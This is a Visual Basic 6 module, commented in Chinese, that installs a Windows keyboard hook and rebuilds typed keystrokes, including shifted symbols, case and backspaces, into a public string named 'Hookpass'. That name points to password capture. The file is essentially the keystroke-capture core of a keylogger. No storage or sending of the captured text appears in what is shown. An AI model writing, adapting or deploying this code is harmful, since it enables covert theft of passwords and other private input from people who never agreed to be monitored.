Attribute VB_Name = "ModHook"
Option Explicit
Public Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Public Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As Integer
Public Declare Function SetWindowsHookEx Lib "user32" Alias "SetWindowsHookExA" (ByVal idHook As Long, ByVal lpfn As Long, ByVal hmod As Long, ByVal dwThreadId As Long) As Long
Public Declare Function UnhookWindowsHookEx Lib "user32" (ByVal hHook As Long) As Long
Public Declare Function CallNextHookEx Lib "user32" (ByVal hHook As Long, ByVal nCode As Long, ByVal wParam As Long, lParam As Any) As Long
Public Declare Function GetKeyNameText Lib "user32" Alias "GetKeyNameTextA" (ByVal lParam As Long, ByVal lpBuffer As String, ByVal nSize As Long) As Long
Public Declare Sub CopyMemory Lib "KERNEL32" Alias "RtlMoveMemory" (lpvDest As Any, ByVal lpvSource As Long, ByVal cbCopy As Long)
Public Const WH_KEYBOARD = 2
Public Const WH_KEYBOARD_LL = 13
'-----------------------------------------
Public Const HC_ACTION = 0
Public Const HC_SYSMODALOFF = 5
Public Const HC_SYSMODALON = 4
'---------------------------------------
Public Const WM_KEYDOWN = &H100
Public Const WM_KEYUP = &H101
Public Const WM_SYSKEYDOWN = &H104
Public Const WM_SYSKEYUP = &H105
Public Type KEYMSGS
       vKey As Long
       sKey As Long
       Flag As Long
       time As Long
End Type
Public strKeyName As String * 255
Public keyMsg As KEYMSGS
'按键状态
Public bolCtrl As Boolean
Public bolShift As Boolean
Public bolCapsLock As Boolean

Public HookID As Long
Public REC As Boolean
Public Hookpass As String
Public Function CallKeyHookProc(ByVal code As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
On Error Resume Next
    '信息
    Dim lKey As Long
    Dim strKeyName As String * 255
    Dim strLen As Long
    Dim strNowInformation As String '比较乱的当前信息
    Dim strInformation As String  '整理后的当前信息
    Dim KeyResult As Long
    '开始
    If code = HC_ACTION Then
        CopyMemory keyMsg, lParam, LenB(keyMsg)
        Select Case wParam
        Case WM_SYSKEYDOWN, WM_KEYDOWN:
            If GetKeyState(vbKeyControl) < 0 Then 'Ctrl按下
                bolCtrl = True
            End If
            If GetKeyState(vbKeyShift) < 0 Then 'Shift按下
                bolShift = True
            End If
        Case WM_SYSKEYUP, WM_KEYUP:
                    If GetKeyState(vbKeyControl) >= 0 Then 'Ctrl抬起
                        bolCtrl = False
                    End If
                    If GetKeyState(vbKeyShift) >= 0 Then  'Shift抬起
                        bolShift = False
                    End If
                    If (GetKeyState(vbKeyCapital) And 1) <> 0 Then 'k_CapsLock按下
                        bolCapsLock = True
                    Else
                        bolCapsLock = False
                    End If
                    '当前信息
                    lKey = keyMsg.sKey And &HFF
                    lKey = lKey * 65536
                    strLen = GetKeyNameText(lKey, strKeyName, 250)
                    strNowInformation = Left(strKeyName, strLen)
                    strInformation = Replace(strNowInformation, "Num", "")
                    strInformation = Replace(strInformation, "Del", ".")
                    strInformation = Replace(strInformation, "Ctrl", "")
                    strInformation = Replace(strInformation, "Shift", "")
                    strInformation = Replace(strInformation, "Alt", "")
                    strInformation = Replace(strInformation, "Tab", "")
                    strInformation = Replace(strInformation, "Right", "")
                    strInformation = Replace(strInformation, "Left", "")
                    strInformation = Replace(strInformation, "Caps Lock", "")
                    strInformation = Replace(strInformation, "caps lock", "")
                    strInformation = Replace(strInformation, "Backspace", "|--|")
                    strInformation = Replace(strInformation, "backspace", "|--|")
                    strInformation = Replace(strInformation, "Space", "")
                    strInformation = Replace(strInformation, "space", "")
                    strInformation = Replace(strInformation, " ", "")
                    '智能判断大小写
                    If bolCtrl = False Then '屏蔽Ctrl
                        If bolShift = False And bolCapsLock = False Then 'Shift和CapsLock都没按下
                            Hookpass = Hookpass & LCase(strInformation)
                        End If
                        If bolShift = False And bolCapsLock = True Then '只CapsLock按下
                            Hookpass = Hookpass & strInformation
                        End If
'KeyResult = GetAsyncKeyState(8)
'If KeyResult = -32767 Then
If InStr(Hookpass, "|--|") > 0 Then
 Hookpass = Replace(Hookpass, Right(Hookpass, 5), "")
End If
                        If bolShift = True Then  'Shift按下(不管有没有CapsLock)数字全部替换
                            Select Case strInformation
                                Case "`"
                                    Hookpass = Hookpass & "~"
                                Case "1"
                                    Hookpass = Hookpass & "!"
                                Case "2"
                                    Hookpass = Hookpass & "@"
                                Case "3"
                                    Hookpass = Hookpass & "#"
                                Case "4"
                                    Hookpass = Hookpass & "$"
                                Case "5"
                                    Hookpass = Hookpass & "%"
                                Case "6"
                                    Hookpass = Hookpass & "^"
                                Case "7"
                                    Hookpass = Hookpass & "&"
                                Case "8"
                                    Hookpass = Hookpass & "*"
                                Case "9"
                                    Hookpass = Hookpass & "("
                                Case "0"
                                    Hookpass = Hookpass & ")"
                                Case "-"
                                    Hookpass = Hookpass & "_"
                                Case "="
                                    Hookpass = Hookpass & "+"
                                Case "["
                                    Hookpass = Hookpass & "{"
                                Case "]"
                                    Hookpass = Hookpass & "}"
                                Case ";"
                                    Hookpass = Hookpass & ":"
                                Case "'" '这个不好写就算了
                                    Hookpass = Hookpass & "'"
                                Case "\"
                                    Hookpass = Hookpass & "|"
                                Case ","
                                    Hookpass = Hookpass & "<"
                                Case "."
                                    Hookpass = Hookpass & ">"
                                Case "/"
                                    Hookpass = Hookpass & "?"
                                Case Else
                                    If bolCapsLock = False Then  '没按CapsLock,字母大写
                                        Hookpass = Hookpass & strInformation
                                    Else '按下CapsLock , 字母小写
                                        Hookpass = Hookpass & LCase(strInformation)
                                    End If
                            End Select
                        End If
                    End If
        End Select
    End If
    If code <> 0 Then
         CallKeyHookProc = CallNextHookEx(0, code, wParam, lParam)
    End If
End Function

